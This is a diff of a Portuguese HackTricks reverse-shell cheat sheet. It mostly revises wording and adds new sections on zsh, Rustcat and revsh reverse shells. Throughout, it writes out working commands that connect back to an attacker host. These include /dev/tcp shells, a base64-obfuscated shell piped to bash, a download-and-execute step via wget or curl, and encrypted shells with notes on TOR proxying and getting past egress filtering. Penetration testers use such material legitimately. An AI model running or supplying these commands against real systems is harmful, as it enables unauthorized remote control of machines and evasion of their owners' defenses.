@@ -2,7 +2,7 @@
 
 {{#include ../../banners/hacktricks-training.md}}
 
-**Se você tiver perguntas sobre qualquer uma dessas shells, você pode verificá-las em** [**https://explainshell.com/**](https://explainshell.com)
+**Se você tiver dúvidas sobre qualquer uma dessas shells, você pode verificá-las em** [**https://explainshell.com/**](https://explainshell.com)
 
 ## Full TTY
 
@@ -23,7 +23,7 @@ exec >&0
 ```
 Não se esqueça de verificar com outros shells: sh, ash, bsh, csh, ksh, zsh, pdksh, tcsh e bash.
 
-### Shell seguro de símbolos
+### Shell seguro de símbolo
 ```bash
 #If you need a more stable connection do:
 bash -c 'bash -i >& /dev/tcp/<ATTACKER-IP>/<PORT> 0>&1'
@@ -32,12 +32,12 @@ bash -c 'bash -i >& /dev/tcp/<ATTACKER-IP>/<PORT> 0>&1'
 #B64 encode the shell like: echo "bash -c 'bash -i >& /dev/tcp/10.8.4.185/4444 0>&1'" | base64 -w0
 echo bm9odXAgYmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC44LjQuMTg1LzQ0NDQgMD4mMScK | base64 -d | bash 2>/dev/null
 ```
-#### Explicação da shell
+#### Explicação do shell
 
-1. **`bash -i`**: Esta parte do comando inicia uma shell Bash interativa (`-i`).
+1. **`bash -i`**: Esta parte do comando inicia um shell Bash interativo (`-i`).
 2. **`>&`**: Esta parte do comando é uma notação abreviada para **redirecionar tanto a saída padrão** (`stdout`) quanto **o erro padrão** (`stderr`) para o **mesmo destino**.
 3. **`/dev/tcp/<ATTACKER-IP>/<PORT>`**: Este é um arquivo especial que **representa uma conexão TCP para o endereço IP e porta especificados**.
-- Ao **redirecionar os fluxos de saída e erro para este arquivo**, o comando efetivamente envia a saída da sessão de shell interativa para a máquina do atacante.
+- Ao **redirecionar os fluxos de saída e erro para este arquivo**, o comando efetivamente envia a saída da sessão do shell interativo para a máquina do atacante.
 4. **`0>&1`**: Esta parte do comando **redireciona a entrada padrão (`stdin`) para o mesmo destino que a saída padrão (`stdout`)**.
 
 ### Criar em arquivo e executar
@@ -47,7 +47,7 @@ wget http://<IP attacker>/shell.sh -P /tmp; chmod +x /tmp/shell.sh; /tmp/shell.s
 ```
 ## Forward Shell
 
-Ao lidar com uma **vulnerabilidade de Execução Remota de Código (RCE)** em uma aplicação web baseada em Linux, alcançar um reverse shell pode ser obstruído por defesas de rede, como regras do iptables ou mecanismos complexos de filtragem de pacotes. Em tais ambientes restritos, uma abordagem alternativa envolve estabelecer um shell PTY (Pseudo Terminal) para interagir com o sistema comprometido de forma mais eficaz.
+Ao lidar com uma **vulnerabilidade de Execução Remota de Código (RCE)** em uma aplicação web baseada em Linux, alcançar um reverse shell pode ser obstruído por defesas de rede como regras do iptables ou mecanismos complexos de filtragem de pacotes. Em tais ambientes restritos, uma abordagem alternativa envolve estabelecer um shell PTY (Pseudo Terminal) para interagir com o sistema comprometido de forma mais eficaz.
 
 Uma ferramenta recomendada para esse propósito é [toboggan](https://github.com/n3rada/toboggan.git), que simplifica a interação com o ambiente alvo.
 
@@ -219,6 +219,48 @@ or
 
 https://gitlab.com/0x4ndr3/blog/blob/master/JSgen/JSgen.py
 ```
+## Zsh (TCP embutido)
+```bash
+# Requires no external binaries; leverages zsh/net/tcp module
+zsh -c 'zmodload zsh/net/tcp; ztcp <ATTACKER-IP> <PORT>; zsh -i <&$REPLY >&$REPLY 2>&$REPLY'
+```
+## Rustcat (rcat)
+
+[https://github.com/robiot/rustcat](https://github.com/robiot/rustcat) – listener moderno semelhante ao netcat escrito em Rust (empacotado no Kali desde 2024).
+```bash
+# Attacker – interactive TLS listener with history & tab-completion
+rcat listen -ib 55600
+
+# Victim – download static binary and connect back with /bin/bash
+curl -L https://github.com/robiot/rustcat/releases/latest/download/rustcat-x86_64 -o /tmp/rcat \
+&& chmod +x /tmp/rcat \
+&& /tmp/rcat connect -s /bin/bash <ATTACKER-IP> 55600
+```
+Features:
+- Opção de flag `--ssl` para transporte criptografado (TLS 1.3)
+- `-s` para iniciar qualquer binário (por exemplo, `/bin/sh`, `python3`) na vítima
+- `--up` para atualizar automaticamente para um PTY totalmente interativo
+
+## revsh (criptografado e pronto para pivotar)
+
+`revsh` é um pequeno cliente/servidor em C que fornece um TTY completo através de um **túnel Diffie-Hellman criptografado** e pode opcionalmente anexar uma interface **TUN/TAP** para pivotação reversa semelhante a VPN.
+```bash
+# Build (or grab a pre-compiled binary from the releases page)
+git clone https://github.com/emptymonkey/revsh && cd revsh && make
+
+# Attacker – controller/listener on 443 with a pinned certificate
+revsh -c 0.0.0.0:443 -key key.pem -cert cert.pem
+
+# Victim – reverse shell over TLS to the attacker
+./revsh <ATTACKER-IP>:443
+```
+Flags úteis:
+- `-b` : bind-shell em vez de reverse
+- `-p socks5://127.0.0.1:9050` : proxy através do TOR/HTTP/SOCKS
+- `-t` : criar uma interface TUN (reverse VPN)
+
+Como toda a sessão é criptografada e multiplexada, muitas vezes contorna filtragens de saída simples que matariam um shell em texto simples `/dev/tcp`.
+
 ## OpenSSL
 
 O Atacante (Kali)
@@ -305,7 +347,7 @@ Xnest :1
 ```
 ## Groovy
 
-por [frohoff](https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76) NOTA: O reverse shell Java também funciona para Groovy
+por [frohoff](https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76) NOTA: O reverse shell em Java também funciona para Groovy
 ```bash
 String host="localhost";
 int port=8044;
@@ -318,5 +360,7 @@ Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new
 - [http://pentestmonkey.net/cheat-sheet/shells/reverse-shell](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell)
 - [https://tcm1911.github.io/posts/whois-and-finger-reverse-shell/](https://tcm1911.github.io/posts/whois-and-finger-reverse-shell/)
 - [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
+- [https://github.com/robiot/rustcat](https://github.com/robiot/rustcat)
+- [https://github.com/emptymonkey/revsh](https://github.com/emptymonkey/revsh)
 
 {{#include ../../banners/hacktricks-training.md}}
